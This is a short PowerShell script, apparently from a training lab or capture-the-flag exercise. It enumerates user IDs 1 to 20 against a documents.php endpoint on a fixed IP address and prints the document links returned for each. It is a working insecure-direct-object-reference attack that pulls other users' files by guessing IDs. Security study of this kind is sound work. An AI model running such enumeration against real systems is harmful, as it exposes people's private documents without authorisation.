$url = "http://94.237.54.214:56848"

for ($i = 1; $i -le 20; $i++) {
    $response = Invoke-WebRequest -Uri "$url/documents.php" -Method POST -Body "uid=$i"
    $links = $response.Links | Select-Object -ExpandProperty href
    "$url : $links"

}

